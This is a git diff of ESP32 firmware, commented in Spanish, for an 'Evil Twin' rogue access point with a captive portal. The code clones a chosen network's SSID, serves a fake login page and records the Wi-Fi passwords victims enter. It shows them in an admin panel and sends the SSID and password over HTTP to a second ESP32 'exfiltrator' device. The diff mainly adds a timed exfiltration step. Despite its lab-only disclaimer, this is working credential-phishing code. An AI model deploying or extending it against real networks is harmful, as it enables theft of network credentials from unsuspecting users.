@@ -1,5 +1,6 @@
 // ============================================================
 //  ESP32 #1 - Evil Twin / Captive Portal
+//by JRXsec & joaks07
 //  Proyecto educativo - Solo uso en laboratorio autorizado
 //  Entorno controlado - No usar en redes ajenas sin permiso
 // ============================================================
@@ -19,12 +20,12 @@
 // Estructuras de datos (antes de defines para compatibilidad
 // con el preprocesador de Arduino IDE)
 // ------------------------------------------------------------
-struct Network {
+typedef struct {
   String  ssid;
   uint8_t bssid[6];
   uint8_t channel;
   int32_t rssi;
-};
+} ScanResult;
 
 struct Attempt {
   String password;
@@ -32,7 +33,7 @@ struct Attempt {
   String timestamp;
 };
 
-#include <Arduino.h>
+#include <functional>
 
 
 // ------------------------------------------------------------
@@ -57,8 +58,8 @@ struct Attempt {
 // Configuracion del ESP32 exfiltrador (#2)
 // >>> DEBE COINCIDIR CON LA CONFIG DEL ESP32 #2 <<<
 // ------------------------------------------------------------
-#define EXFIL_AP_SSID   "EvilTwin-Link"
-#define EXFIL_AP_PASS   "exfil_pass_123"
+#define EXFIL_AP_SSID   "Livebox"
+#define EXFIL_AP_PASS   "tryharder"
 #define EXFIL_ENDPOINT  "http://192.168.10.1/recv"
 
 
@@ -91,9 +92,9 @@ IPAddress   apIP(192, 168, 4, 1);
 DNSServer   dnsServer;
 WebServer   webServer(80);
 
-Network  networks[MAX_NETWORKS];
+ScanResult  networks[MAX_NETWORKS];
 int      networkCount    = 0;
-Network  selectedNetwork;
+ScanResult  selectedScanResult;
 bool     networkSelected = false;
 bool     hotspotActive   = false;
 bool     deauthActive    = false;
@@ -101,6 +102,9 @@ bool     deauthActive    = false;
 Attempt  attempts[50];
 int      attemptCount       = 0;
 String   capturedCredential = "";
+
+bool          pendingExfil = false;
+unsigned long exfilTimer   = 0;
 
 unsigned long lastScan     = 0;
 unsigned long lastWifiChk  = 0;
@@ -112,7 +116,7 @@ bool          ledState     = false;
 // Prototipos
 // ------------------------------------------------------------
 void   performScan();
-void   clearNetworks();
+void   clearScanResults();
 String bytesToStr(const uint8_t* b, uint32_t size);
 bool   isMacAllowed(const String& mac);
 String getClientMac();
@@ -168,7 +172,29 @@ void loop() {
   webServer.handleClient();
   updateLED();
 
-  if (!hotspotActive && millis() - lastScan >= SCAN_INTERVAL) {
+  if (pendingExfil && millis() - exfilTimer >= 1500) {
+    pendingExfil = false;
+    Serial.println("[Loop] Iniciando exfiltracion...");
+    stopEvilTwin();
+    delay(300);
+
+    WiFi.mode(WIFI_STA);
+    delay(200);
+    sendToExfil(selectedScanResult.ssid, capturedCredential);
+
+    WiFi.disconnect(true);
+    delay(300);
+    WiFi.mode(WIFI_AP_STA);
+    delay(200);
+
+    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+    WiFi.softAP(selectedScanResult.ssid.c_str());
+    dnsServer.start(DNS_PORT, "*", apIP);
+    hotspotActive = true;
+    Serial.printf("[Loop] Evil Twin reactivado como: %s\n", selectedScanResult.ssid.c_str());
+  }
+
+  if (!hotspotActive && !pendingExfil && millis() - lastScan >= SCAN_INTERVAL) {
     performScan();
     lastScan = millis();
   }
@@ -181,7 +207,7 @@ void loop() {
 void performScan() {
   Serial.println("[Scan] Escaneando redes...");
   int n = WiFi.scanNetworks();
-  clearNetworks();
+  clearScanResults();
   if (n <= 0) { Serial.println("[Scan] Sin redes."); return; }
   networkCount = (n < MAX_NETWORKS) ? n : MAX_NETWORKS;
   for (int i = 0; i < networkCount; i++) {
@@ -193,7 +219,7 @@ void performScan() {
   for (int i = 0; i < networkCount - 1; i++) {
     for (int j = 0; j < networkCount - i - 1; j++) {
       if (networks[j].rssi < networks[j+1].rssi) {
-        Network tmp    = networks[j];
+        auto tmp       = networks[j];
         networks[j]   = networks[j+1];
         networks[j+1] = tmp;
       }
@@ -202,7 +228,7 @@ void performScan() {
   Serial.printf("[Scan] %d redes encontradas.\n", networkCount);
 }
 
-void clearNetworks() {
+void clearScanResults() {
   networkCount = 0;
   for (int i = 0; i < MAX_NETWORKS; i++) networks[i].ssid = "";
 }
@@ -272,10 +298,10 @@ void startEvilTwin() {
   WiFi.softAPdisconnect(true);
   delay(200);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(selectedNetwork.ssid.c_str());
+  WiFi.softAP(selectedScanResult.ssid.c_str());
   dnsServer.start(DNS_PORT, "*", apIP);
   hotspotActive = true;
-  Serial.printf("[EvilTwin] AP activo como: %s\n", selectedNetwork.ssid.c_str());
+  Serial.printf("[EvilTwin] AP activo como: %s\n", selectedScanResult.ssid.c_str());
 }
 
 void stopEvilTwin() {
@@ -288,13 +314,13 @@ void stopEvilTwin() {
 }
 
 void restartEvilTwin() {
-  sendToExfil(selectedNetwork.ssid, capturedCredential);
+  sendToExfil(selectedScanResult.ssid, capturedCredential);
   delay(500);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(selectedNetwork.ssid.c_str());
+  WiFi.softAP(selectedScanResult.ssid.c_str());
   dnsServer.start(DNS_PORT, "*", apIP);
   hotspotActive = true;
-  Serial.printf("[EvilTwin] Reactivado como: %s\n", selectedNetwork.ssid.c_str());
+  Serial.printf("[EvilTwin] Reactivado como: %s\n", selectedScanResult.ssid.c_str());
 }
 
 void updateLED() {
@@ -325,36 +351,38 @@ void logAttempt(const String& pwd) {
 // EXFILTRACION - WiFi al ESP32 #2
 // ============================================================
 void sendToExfil(const String& ssid, const String& pwd) {
-  Serial.println("[Exfil] Conectando al ESP32 #2...");
+  Serial.printf("[Exfil] Conectando a '%s'...\n", EXFIL_AP_SSID);
 
   WiFi.begin(EXFIL_AP_SSID, EXFIL_AP_PASS);
 
   unsigned long t = millis();
-  while (WiFi.status() != WL_CONNECTED && millis() - t < 10000) {
-    delay(200);
+  while (WiFi.status() != WL_CONNECTED && millis() - t < 12000) {
+    delay(250);
     Serial.print(".");
   }
   Serial.println();
 
   if (WiFi.status() != WL_CONNECTED) {
-    Serial.println("[Exfil] No se pudo conectar al ESP32 #2. Credencial guardada en RAM.");
+    Serial.println("[Exfil] No se pudo conectar al ESP32 #2.");
     return;
   }
 
-  Serial.println("[Exfil] Conectado. Enviando...");
+  Serial.printf("[Exfil] Conectado a %s. Enviando...\n", EXFIL_AP_SSID);
 
   HTTPClient http;
   http.begin(EXFIL_ENDPOINT);
   http.addHeader("Content-Type", "application/x-www-form-urlencoded");
+  http.setTimeout(5000);
 
   String body = "ssid=" + ssid + "&password=" + pwd;
   int code = http.POST(body);
 
-  Serial.printf("[Exfil] Respuesta HTTP: %d\n", code);
+  if (code == 200) {
+    Serial.printf("[Exfil] Enviado OK (HTTP %d)\n", code);
+  } else {
+    Serial.printf("[Exfil] Error HTTP: %d\n", code);
+  }
   http.end();
-  WiFi.disconnect();
-  delay(200);
-  Serial.println("[Exfil] Listo.");
 }
 
 
@@ -373,7 +401,7 @@ String pageFooter() {
 }
 
 String portalIndex() {
-  String ssid = networkSelected ? selectedNetwork.ssid : "WiFi_Gratuito";
+  String ssid = networkSelected ? selectedScanResult.ssid : "WiFi_Gratuito";
   String css =
     "body{margin:0;padding:0;font-family:Arial,sans-serif;background:#fff;}"
     ".logo-bar{background:#8B4513;padding:18px 0 10px;text-align:center;}"
@@ -454,7 +482,7 @@ String buildAdminPanel() {
   html += "Redes: <b>" + String(networkCount) + "</b> &nbsp;|&nbsp; ";
   html += "Credenciales capturadas: <b style='color:#2ecc71'>" + String(attemptCount) + "</b></p>";
   if (networkSelected) {
-    html += "<p>Red: <b>" + selectedNetwork.ssid + "</b> | Ch " + String(selectedNetwork.channel) + " | " + String(selectedNetwork.rssi) + " dBm</p>";
+    html += "<p>Red: <b>" + selectedScanResult.ssid + "</b> | Ch " + String(selectedScanResult.channel) + " | " + String(selectedScanResult.rssi) + " dBm</p>";
   }
   html += "</div>";
 
@@ -477,7 +505,7 @@ String buildAdminPanel() {
     html += "<table><tr><th>#</th><th>SSID</th><th>BSSID</th><th>Canal</th><th>RSSI</th><th>Accion</th></tr>";
     for (int i = 0; i < networkCount; i++) {
       String bssid = bytesToStr(networks[i].bssid, 6);
-      bool isSel = networkSelected && bytesToStr(selectedNetwork.bssid, 6) == bssid;
+      bool isSel = networkSelected && bytesToStr(selectedScanResult.bssid, 6) == bssid;
       html += "<tr><td>" + String(i+1) + "</td><td>" + networks[i].ssid + "</td>";
       html += "<td><small>" + bssid + "</small></td>";
       html += "<td>" + String(networks[i].channel) + "</td>";
@@ -494,7 +522,7 @@ String buildAdminPanel() {
     html += "<table><tr><th>#</th><th>SSID</th><th>Contrasenna</th><th>Tiempo</th></tr>";
     for (int i = attemptCount - 1; i >= 0; i--) {
       html += "<tr><td>" + String(i+1) + "</td>"
-              "<td>" + selectedNetwork.ssid + "</td>"
+              "<td>" + selectedScanResult.ssid + "</td>"
               "<td><span class='pwd'>" + attempts[i].password + "</span></td>"
               "<td>" + attempts[i].timestamp + "</td></tr>";
     }
@@ -525,7 +553,7 @@ void handleAdmin() {
     String target = webServer.arg("ap");
     for (int i = 0; i < networkCount; i++) {
       if (bytesToStr(networks[i].bssid, 6) == target) {
-        selectedNetwork = networks[i];
+        selectedScanResult = networks[i];
         networkSelected = true;
         break;
       }
@@ -575,9 +603,8 @@ void handlePortal() {
       "Vuelve a conectarte a tu red WiFi.</p>"
       "</body></html>");
 
-    delay(500);
-    stopEvilTwin();
-    restartEvilTwin();
+    pendingExfil = true;
+    exfilTimer = millis();
 
   } else {
     webServer.send(200, "text/html", portalIndex());
